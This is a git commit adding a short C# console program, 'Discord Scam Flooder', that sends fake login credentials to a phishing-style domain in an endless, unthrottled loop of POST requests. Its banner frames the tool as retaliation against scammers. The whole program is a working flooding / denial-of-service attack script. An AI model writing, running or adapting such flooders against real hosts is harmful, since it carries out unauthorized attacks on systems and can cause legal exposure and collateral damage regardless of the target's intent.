4ad94dd96ed6850cbab9328ad8e0ebfb8e79d59e
Half <81921403+HalfDecentAnimator@users.noreply.github.com>
2022-02-03 20:41:30 +0000

    Add Initial Files

---
+++ DiscordScamSpam/Program.cs
@@ -0,0 +1,25 @@
+﻿namespace DiscordScamSpam
+{
+    static class Program
+    {
+        static async Task Main(string[] args)
+        {
+            Console.WriteLine("###############################################");
+            Console.WriteLine("## DISCORD SCAM FLOODER BY AXON TECHNOLOGIES ##");
+            Console.WriteLine("## THIS IS WHAT YOU GET FOR SCAMMING PEOPLE! ##");
+            Console.WriteLine("###############################################\n");
+            string endpoint = "https://disocrds.gift/discord/login";
+            long sent = 0;
+            string payload = "{\"login\":\"RAIDED_BY_AXON_TECHNOLOGIES\",\"password\":\"RAIDED_BY_AXON_TECHNOLOGIES\"}";
+            HttpClient httpClient = new HttpClient();
+            HttpContent httpContent = new StringContent(payload);
+            Console.Write("POSTed 0 Payloads.");
+            do
+            {
+                httpClient.PostAsync(endpoint, httpContent).ConfigureAwait(false);
+                sent++;
+                Console.Write($"\rPOSTed {sent} Payloads.");
+            } while (true);
+        }
+    }
+}
